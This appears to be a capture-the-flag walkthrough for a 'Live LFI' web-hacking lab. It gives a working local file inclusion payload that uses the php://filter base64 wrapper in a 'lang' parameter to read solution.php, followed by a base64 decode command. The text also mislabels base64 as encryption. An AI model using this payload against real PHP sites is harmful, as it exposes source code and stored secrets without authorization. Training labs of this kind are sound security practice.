## Live LFI
One reason why I wanted the warchall box is to offer more realistic webhacking challenges.
You may now try the Live LFI challenge that is hosted on it.

### Level14
Your objective is to retrieve the content of the `solution.php` file using LFI. Follow the steps below to complete the challenge.

1- Visit the following link in the web browser:
```
https://lfi.warchall.net/index.php?lang=solution.php
```
2- Try using the LFI vulnerability by appending the following payload to the URL:
```
https://lfi.warchall.net/?lang=php://filter/read=convert.base64-encode/resource=solution.php
```
This payload utilizes the `php://filter` stream to encode the content of `solution.php` in base64.

3- Copy the encrypted base64-encoded text from the webpage and decode it using the following bash command in your terminal:
```bash
  echo "text_encrypted" | base64 -d
```
